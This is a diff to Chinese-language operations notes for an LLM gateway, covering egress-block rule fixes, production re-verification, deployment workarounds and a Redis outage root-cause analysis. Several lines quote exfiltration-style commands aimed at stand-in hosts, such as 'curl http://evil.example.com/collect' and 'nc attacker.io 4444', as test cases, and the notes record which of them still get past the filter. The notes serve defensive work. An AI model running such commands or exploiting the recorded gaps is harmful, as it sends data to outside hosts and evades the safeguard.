@@ -135,11 +135,27 @@
 - ~~**域名形式的外传目标从不被拦**~~（`curl http://evil.example.com/collect`
   不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**r1016 已修**（域名只在 URL 主机位
   识别，不做裸点分词，否则 `cat README.md`、`v1.2.3` 全会被误判），**r1017 补齐
-  残留的裸主机+端口形态**。**两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
+  残留的裸主机+端口形态**（**该形态已于 r1018 撤除**，见下）。
+  **两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
   上线**——那两轮部署由并行会话执行，`37099db2` 是本仓提交，含 r1016/r1017。
   线上复验：`/v1/models` 对伪造 `sk-` token 已返回 401（修复前 200 + 615 个模型）。
   **关键设计**：默认公网可达即阻断，只豁免明确不可路由的主机
   （`.local/.internal/.cluster.local/.lan/.home.arpa` 等 + 单标签名）。
+- ★ **r1016/r1017 自身引入过两类大面积误伤（r1018 已修正，教训值得单独记）**：
+  r1016 的 `user@host` 正则把 `npm install lodash@4.17.21`、`go get x@v1.2.3`、
+  `cargo add serde@1.0.197` 等**装包命令整类阻断**（pkg@1.2.3 被当成 user@host，
+  且 `4.17.21` 走默认公网判定）；r1017 的「裸主机+空格+端口」正则把
+  `node server.js 8080`、`python3 main.py 100` **打死**。两条规则已撤除——
+  前者冗余（email 规则 + isNonExfiltrationEmailFragment 已覆盖），
+  后者与脚本调用**结构上不可区分**，默认阻断方向就是错的。
+  **教训**：把「锚定上下文」当成充分条件是错的——锚定之后那段文本**仍然未必是
+  主机**（`pkg@1.2.3` 的 `4.17.21`、`main.py` 都不是）。判据见
+  `TestR1017VersionSpecsAndScriptArgsAreNotDestinations`，谁再往提取器里加
+  「长得像主机」的形态会先撞上它。
+  **残留缺口**：`nc attacker.io 4444`、`curl evil.io/path`（无 scheme）仍放行。
+  **2026-10-11 深夜已在两台生产实测确认**（245 `2546-97e833a1`、154
+  `2547-97e833a1`，全路径端到端 13/14 通过，唯一未通过项就是这个残留缺口）。
+  要收口它的唯一自洽方向是**命令动词表**，不要再加形态枚举。
 - ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
   整条 `output_policy_blocked`，而 `ssh ops@10.24.7.91` 放行——**同一操作，写 IP
   放行、写内网域名阻断**，与 dc63f19ff 同构。**r1017 已修**：豁免按**类型**分派，
@@ -193,26 +209,39 @@
 在本地任务注册表中已不存在（not found），无法回读其输出——按批判原则，
 它们的「succeeded」状态**不得**被转述为「已读取并确认」。
 
-### 下一轮提示词（收尾核验轮产出）
+### 下一轮提示词（2026-10-12 深夜轮更新）
 
-1. **部署 r1016+r1017**（需用户显式授权）：`a3b65ba68` 已在 origin/main。部署后
-   复验三件事：`/v1/models` 带伪造 token 必须 401；`ssh ops@10.24.7.91 uptime` 与
-   `ssh ops@内网域名 uptime` 同放行；公网域名外传（`curl http://evil.example.com`）
-   仍阻断。生产当前 2533（他人部署），蓝绿端口看
-   `/opt/llm-gateway-go/run/active-upstream.conf`。
-2. **上游可路由性（口径已修正）**：旧口径「成功率 ~50%」系统计噪音（探针失败 +
-   401 风暴混入），午间复测实况 503≈2.5%、11 时真实成功率约 75%（详见
-   `docs/audit/2026-10-11-154-503-口径修正与漂移清单.md`）。**模型目录漂移仍是
-   实体问题**：12 凭据、96 模型名 404/410。属数据/配置层决策（清退失效绑定 /
-   修模型目录 / 降权重），代码不可解，等用户拍板。**另注意生产
-   `archive_request_logs_default`（42703）是 754 修复前的坏版本，TTL 归档从未
-   工作，重放 754 即修**。审计统计一律用热表，别拿父表 `success` 列算比率
-   （8h 滞后）。
-3. **fail-open 占位符透传遗留缺陷**：96 行样本、真值零泄漏、中低危，根因未定位；
+1. ~~r1016/r1017 生产复验~~ **已完成（深夜轮独立复验，非转抄 7d5efa21c）**：
+   154=2547、245=2546 均含 r1016/r1017/r1018；models 伪造 token 401、
+   ssh@IP/内网域名放行、npm install 放行、公网域名 403+`output_policy_blocked`、
+   EOL 凭据 healthy 仅 binding 摘除——全部通过，详见
+   `docs/audit/2026-10-12-深夜轮-r1018复验与拍板执行.md`。
+2. ~~漂移绑定 + archive 42703 两项拍板~~ **已执行（深夜轮）**：漂移绑定清退 228 条
+   （`model_probe_broken` 词汇，双备份表 `bak_20261011_drift_bindings{,_b}` 可逆，
+   残留 0）；archive 42703 发现已被部署链修复（函数体含 gw_session_id），手动
+   触发 `archive_request_logs_default(30)` 成功建出 `request_logs_archive_2026_08`。
+3. **深夜轮三项代码收口已推送（394da3d12）待部署**：EOL 识别改按 410 状态码
+   （不再押厂商措辞，404 保留措辞门槛）、A2 量具接
+   `/api/admin/anomaly-reporter/stats`、deploy-local 空 web/ refuse 门。
+   下次部署授权时随包上线（不要为它们单独赶一轮部署）。
+4. **probe_direct_auth_failed 是探针失败主体**（2546 上线后 30min 内 204 条，
+   集中在 8/18/19 等凭据）——凭据 key 疑似真死，数据/配置层清退决策待 owner。
+   失效 sk-* key 持有方通知（漂移文档 §三）仍未落地。审计统计一律用热表
+   `request_logs_hot` 或按 `error_kind` 细分，别拿父表 `success` 列算比率。
+5. **fail-open 占位符透传遗留缺陷**：96 行样本、真值零泄漏、中低危，根因未定位；
    推进需在 fail-open 分支加结构化日志 + 收集真实流量 + 另行发布授权。
-4. **还原半程**：601,914 行 `original_encrypted` 全 NULL。若用户要还原功能，
+6. **还原半程**：601,914 行 `original_encrypted` 全 NULL。若用户要还原功能，
    决策点是把 `db_sink.go` 加解密读取方（新代码）而不是配密钥（无读取方，
    配了也白配）。
+7. 窗口外分支：远端 UNMERGED 剩 3 条承载独有内容的
+   （`2026-07-25-realtime-routing-self-heal` 24 篇设计文档归档 +9536 行、
+   `fix/w5-ml-ci-runbook` +327、`fix/w6-monitor-docs` +613），留置待维护者
+   决定合并或放弃；本地分支已清空；已删 5 远端（3 条 patch-id 等价于 main、
+   2 条 3 行过期 README 徽章同步）+ 2 本地已合并。
+8. **批量操作量具坑（新增，判据纪律第 5 条）**：`node_probe_state` 被探针周期
+   并发改写，READ COMMITTED 逐语句快照会在改写窗口读到半写状态（深夜轮第一批
+   清退因此静默漏掉 cred 18/19 的 127 条——预览 234、执行 107，非数据变化）。
+   凡以它为源的批量操作一律 REPEATABLE READ 单快照 + 双时间点复验。
 
 ## 已完成（已推送）
 
@@ -248,11 +277,22 @@
    - **部署轮验证**：2538 上线后 127.0.0.1:8782 / mesh 8782 / mesh 8443
      (caddy) / 公网 443 SNI→252:9443→mesh 8782 四入口全绿，**收尾零孤儿
      进程**（新机制首次实战生效）。
+8. **2026-10-12 深夜轮**（r1018 生产复验 + 两项拍板执行 + 分支裁决），详见
+   `docs/audit/2026-10-12-深夜轮-r1018复验与拍板执行.md`：
+   - 独立复验 2546/245 + 2547/154 全通过（复验矩阵见审计文档 §二）；
+   - 漂移绑定清退 228 条（0 残留，双备份表可逆）；archive 42703 已被部署链
+     修复，手动触发归档验证通过；
+   - 三项代码收口（EOL 按 410 状态码 / A2 admin 端点 / refuse 门）已推送
+     394da3d12，**待下次部署**；
+   - 分支裁决：删 5 远端 + 2 本地，留 3 条独有内容远端；
+   - 新增量具坑：`node_probe_state` 并发改写窗口读半写（判据纪律第 5 条）。
 
 
 ## 剩余任务（按依赖顺序）
 
-0. **陈旧分支清理（窗口外遗留，下轮顺手项）**：本地分支 `fix/sanitize-mutation-tolerant-restore`（d47f52703，10-08）已被已合并的 v2（`fix/sanitize-mutation-tolerant-restore-v2`，7cbf65478）取代，远端引用已被 prune——下轮确认后 `git branch -D` 即可。
+~~0. **陈旧分支清理（窗口外遗留，下轮顺手项）**~~ **已完成（2026-10-12 深夜轮）**：
+`fix/sanitize-mutation-tolerant-restore-v2` 与 `fix/sanitize-hop-passthrough`
+均已 `git branch -d` 删除（当时确认已合并），本地仅剩 main。
 
 ### 任务 1 — 编译 / vet / gofmt / 单元测试
 
@@ -422,6 +462,25 @@ bash scripts/apply-db-revision-sequence_test.sh      # rc=0；失败即迁移投
 cd installer && go test ./...                        # rc=0；失败即 installer 同步缺口
 ```
 
+## ⚠️ 部署脚本的 ENVS_ROOT 默认值已过时（2026-10-11 深夜实测踩到）
+
+`scripts/deploy-seamless.sh:163` 的默认值是
+`${HOME}/workspace/ai-native-workspace/envs`，而仓库已迁到
+`ai-native-tools/envs`，直接跑会失败：
+
+```
+✗ envs SSOT loader not found: /Users/niuer/workspace/ai-native-workspace/envs/loader.sh
+```
+
+绕过（**未改共享脚本**，那是部署基础设施 SSOT，改动应由其维护者裁决）：
+
+```bash
+ENVS_ROOT="$HOME/workspace/ai-native-tools/envs" bash scripts/deploy-seamless.sh deploy 245 --seq NNNN
+```
+
+`--seq` 也可能不被采纳（实测传 2538 到 154，release 落成 2547）——**以部署脚本
+回显的 `version=` 为准**，不要拿自己传的 seq 去核对产物目录名。
+
 ## 部署 245 的实操（2026-10-11 全程走通）
 
 ```bash
@@ -453,10 +512,15 @@ bash scripts/deploy-245.sh --seq <seq>          # seq 必须自增且不与他�
 
 ### SSOT 软链的真实情况
 
-**2026-10-11 下午更新：`~/workspace/ai-native-tools/` 目录已从本机消失**，
-`~/workspace/ai-native-workspace/deploy-lib`（软链目标，`lock.sh` 在场）成为唯一
-SSOT——**软链现在解析有效**，`AIAN_DEPLOY_LIB` 可不设或指 ai-native-workspace。
-本机各目录朝不保夕（同日 `~/sdk/bash5` 也被清过），用前先 `ls` 确认。
+**2026-10-11 晚间复测更正（多 checkout/多机事实不同，用前必须实测）**：
+下午那轮「ai-native-tools 已从本机消失、软链解析有效」的记录**对本
+checkout（llm-gateway-go）不成立**——22:xx 实测：`ai-native-tools/deploy-lib`
+**在场**、`ai-native-workspace/deploy-lib` **不在**，本 checkout 的
+`scripts/deploy-lib` 软链（目标 `../../ai-native-workspace/deploy-lib`）**断链**
+（deploy_local_contract_test 在 cd 软链处挂）。下午的记录可能出自另一份
+checkout 或当时目录状态确有变化（同日 `~/sdk/bash5` 确被清过一次）。
+**结论不变的部分**：任何会话跑 deploy 相关脚本前先 `ls` 确认两处 SSOT
+哪个在场，用 `AIAN_DEPLOY_LIB` 指向在场的那个；软链 rebind 仍留维护者裁决。
 
 ### host-first 本地部署的 2538 轮新坑（2026-10-11 下午实测）
 
@@ -474,6 +538,82 @@ SSOT——**软链现在解析有效**，`AIAN_DEPLOY_LIB` 可不设或指 ai-na
    行为差异：探测成败取决于跑部署的 shell 环境，不在代码。
 3. 2538 起部署收尾多了孤儿网关清扫（见「已完成」2026-10-11 下午审计轮）；
    `run/gateway.build` 是每次部署的构建暂存产物，属正常残留，不用手工清。
+
+---
+
+# 追加：2026-10-11 深夜轮——154 全局变慢根因修复（UrsmlHealthyKeyReconciler）
+
+> 会话时间 2026-10-11 23:29 → 10-12 01:00。用户目标：154 网关响应非常慢，
+> 分析 154 网关 + 252 网关数据库日志，修正后优化 252 数据库，验证后提交推送。
+> **已完成分析、止血、代码修复（含变异验证）、252 DB 优化项核验、提交推送。**
+
+## 根因（端到端证据链，全部实测）
+
+1. **症状**：`/v1/chat/completions` p90=16.8s、p99=889s、max=85 分钟；
+   `router: URSM v2 authoritative view filtered out every candidate` 告警全天上升
+   （15 时 21 条 → 22 时 352 条）。机制：候选全灭后请求进
+   `wait_recovery_window`——30s 间隔、deadline 5 小时（`deadline_remaining_sec:17999`），
+   客户端拿到 200+keepalive 后被一直挂着 = 用户看到的「非常慢」。
+   受灾模型：gpt-6-astra(566)/glm-5.3(482)/claude-opus-5(373)。
+2. **直接原因**：URSM v2（Redis db2，authoritative 模式）里这些健康凭据的
+   节点键缺失/过期。T4 契约：**缺键 = Available=false**（fail-closed 保护拒绝）。
+3. **为什么会缺**（结构性，三件事叠加）：
+   - 2026-09-20 probe-volume 政策（`MarkNodeProbeHealthy`）：每次成功业务请求把
+     node_probe_state 行 park 30 天（`next_retry_at = now() + interval '30 days'`，
+     bg/node_probe.go:1510）——健康对**不再有任何主动探测**。
+   - 节点键只剩请求遥测在写（record_request.lua，priority=10，**分钟级 TTL**）。
+     probeWriteTTLFloor=7h 只作用于探测写，而 park 政策后探测写永不发生。
+   - 流量间隙 > TTL ⇒ 键过期 ⇒ 全灭 ⇒ park 5h；park 期间**无遥测、无探测、无恢复
+     路径**（36h lookback 只覆盖 `cmb.available=FALSE` 的绑定，健康对是盲区），
+     直到每天 ~00:30 integrity_verify 清扫才自愈。**这是死锁式锁死**。
+4. **今日放大器**：15:45:58 一次 `redis_unavailable` recovery（epoch 哈希：
+   recovery_counter=5537、recovered_keys_count=769）用快照覆盖/替换了大量节点键
+   ——此后告警从个位数暴涨。recover 之所以被触发：persist collect 对共享 db2
+   （**170 万键**）做全量 SCAN，30s 预算实测要 12.95–30.40s，频繁 i/o timeout
+   （gateway 日志 `persist collect failed` 多条）。代码注释（cmd/gateway/main.go
+   URSM_V2_REDIS_DB 段）自己就预言了这个代价。
+5. **旁证**：gateway 模式探测全部 401（r1016/r1017 鉴权修复连带，node_probe_runs
+   里 `gateway_ok=f 401` vs `direct_ok=t 200`）；direct 探测不受影响。
+
+## 已落地
+
+1. **止血（生产 Redis，~00:10-00:45）**：按 DB 健康谓词（bindings available +
+   credentials active/ready + providers enabled + nps 无失败）筛出 253 对健康绑定，
+   用 apply_probe.lua 成功语义重写节点键（priority=20，TTL 7h）；其中唯一
+   单凭据无探测覆盖的 gpt-6-astra 单独补写。**效果：告警 100+/10min → 00:41 起 0**。
+2. **代码修复（本提交）**：`bg/ursm_healthy_reconcile.go` +
+   `bg/ursm_healthy_reconcile_test.go` + `cmd/gateway/main.go` 接线（bootstrap 块后）。
+   `UrsmlHealthyKeyReconciler`：默认 60s tick（settings_kv
+   `ursm.healthy_reconcile_interval_seconds`，<=0 关闭），每轮把 **DB 验证健康**
+   的可路由对经 `FilterAndScoreReady`（单条 pipeline，无 SCAN）读视图，
+   对判不可用者走 `ApplyProbeForTenant(success=true)`（与探测同路径：
+   probe 优先级 + 7h TTL floor + manual_hold 让步 + 冷却即恢复）。
+   安全边界：只写 DB 健康对（T4 fail-closed 对无证据对不被打穿）；
+   ready 门关着时整轮跳过；authoritative 模式空租户对跳过。
+   **7 个单测 + 两轮变异验证有牙**（删 Available 过滤→红；绕 ready 门→红；
+   第一版关闸测试因未播种 DB 行是假绿，已修——AGENTS「判据必须在同一层」再+1）。
+3. **252 数据库优化项核验**：`archive_request_logs_default` 实测已含
+   `gw_session_id` 且手动执行成功（42703 已消，幂等重放已被并行会话完成）。
+   其余 PG 负载（analyze_llm_gateway_table_stats 均值 150s×25、session 分析族、
+   MV 刷新）为产品功能非故障，未动。
+
+## 待办（下一轮）
+
+1. **★ 重部署 154/245 网关使 reconciler 生效**（本提交只在仓库；生产当前靠
+   止血 + 每日 integrity 清扫维持，明日流量间隙仍可能复现个别模型锁死至 00:30）。
+   部署后验证：日志应出现 `ursm.v2 healthy-key reconciler started`，且
+   `filtered out every candidate` 告警不再持续出现。
+2. **URSM_V2_REDIS_DB 迁移到独立 db**（代码已支持，注释在 main.go URSM 段）：
+   一并消除 persist SCAN 走 170 万会话键的超时 → redis_unavailable 假恢复
+   的触发源。需要重启 + coverage bootstrap 收敛，留维护者窗口。
+3. 观测：`ursm:v2:meta:epoch` 的 recovery_counter（5537）与
+   `persist collect failed` 频率是本链路的健康表；接线到 /metrics 更好
+   （与已登记的 A2 量具缺口同类）。
+4. 现场残留：Redis db2 有少量键名含 `':'` 引号的乱码节点键
+   （如 `ursm:v2:node:default':'61':'gpt-6-astra`，来源未定，疑似并行会话/脚本；
+   无读方，无害）——下次维护可顺手清。
+5. gateway 模式探测 401（r1017 连带）与 EOL 措辞 contains 脆弱（已登记项）
+   未动；glm-5.2 系 410、sensenova 系等模型目录漂移仍待 owner 拍板。
 
 ---
 
@@ -560,3 +700,50 @@ glm-5.2 系 10×410）。**待 owner 拍板：清退 / 修目录 / 降权**—�
    `npm install --package-lock-only` 重生成修过一次；**改依赖后记得同步**。
 4. 部署全程需要：`PATH` 含 `~/sdk/go/bin`（go1.27.1）与
    `~/sdk/bash5/bin`（deploy-lib bash 4+ 语法），否则分别在后端构建与 lib 加载处失败。
+
+## 2026-10-11 晚间 24h 审计轮（窗口 10-10 22:16 → 10-11 21:16，46 提交逐条批审）
+
+**拉取**：快进合并 `9fe5320b6..b98678fc5`（6 提交：SPA 深链 401 放行 r2540、
+host-first 孤儿网关回收 + 517 形态探测 r2538、mobile UX 第二轮、252 netbird 文档、
+12h 审计 A1/A2、r1016/r1017 生产复验文档）。
+
+**全门状态（本轮实测）**：`go build ./...`、`go vet ./...` rc=0；
+`apply-db-revision-sequence_test` rc=0；installer 13 包全绿；
+`CGO_ENABLED=0 go test ./admin/... ./bg/... ./settings/... ./domains/stats/...`
+仅负向闸门 `TestV1BodiesReadersAreAssessed` 一红（维护者策略）；新增测件
+`middleware`（含 auth_mw 三件套）ok、`tests/deploy_local_reap_test.sh` rc=0；
+`security/...` 全绿、`domains/streaming` ok（168s）；web-mobile 193 文件
+7177 测试全绿。
+
+**三族实质发现（已修/已登记）**：
+
+1. **a60391fb0（SPA 深链 text/html 放行）放行面核验通过，但安全性是隐式的**——
+   逐条核验了 AuthMiddleware 守卫范围内全部 mux 路径：`/internal/*`、
+   `/api/v1/plugins/*` 自带 AdminToken/AdminMiddleware 守卫；
+   `/v1beta/models/`（**不匹配** `/v1` 前缀判断）与 `/v1/models/` 挂的
+   GeminiHandler 对列表形状 404、对 `:generateContent` 交给 ChatHandler
+   内嵌 keyVerifier 段二次鉴权（handler.go:2315，fail-closed）——无匿名暴露面。
+   已在 `middleware/auth_mw.go` 的 `spaProtectedPrefixes` 上补维护契约注释：
+   未来把无自守卫的新 handler 挂顶层路径必须同步加清单，否则 text/html 匿名直达。
+2. **9fe5320b6 A2 的 `PermanentlyDisabled`/`PermanentRejections` 无生产消费方**
+   （Stats() 只被测试调用）——自禁用事件有 slog.Error 兜底（日志可见），
+   缺聚合视图，P3 遗留：接线到 /metrics 或 admin 端点留给下轮。
+3. **AGENTS SSOT 段文档失真已更正**（上方「SSOT 软链的真实情况」节）：
+   下午「ai-native-tools 已消失、软链有效」对本 checkout 不成立，实测
+   ai-native-tools 在场、ai-native-workspace 不在、软链断——多 checkout/
+   多机事实不同，用前先 ls。
+
+**遗留（登记不修）**：12272e57c 的 EOL 识别靠措辞 contains（"end of life"/
+"no longer available"），上游换文案会漏判回凭据级（probe 风暴复发点）；
+窗口外 8 条 UNMERGED 远端分支（最后提交 ≤09-28，清单见审计输出）按保守口径
+只登记不删；本地 2 条已合并 sanitize 分支同口径。
+
+**分支窗口结论**：24h~1h 窗口内零未合并分支，无需删/合并动作。
+
+**补充（推送时合并进来的 r1018，a39bb6769）**：并行会话对 r1016/r1017 做批判审计，
+发现两条自引入的大面积误伤——`pkg@1.2.3` 被 egressHostFromUserInfo 当成
+`user@host` 整类阻断装包命令；`nc attacker.io 4444` 收口正则误伤
+`node server.js 8080` 形态的脚本调用。r1018 撤掉这两条有害提取规则（其原覆盖面
+本就由 email/IP 规则 + r1017 的 isNonExfiltrationEmailFragment 兜住）。
+**本晚间审计轮批读 a3b65ba68 时未深审到这两个误伤面，属审计盲区，如实记录**。
+下一轮生产复验若见「装包/脚本调用不再被阻断」即 r1018 效果，非回归。
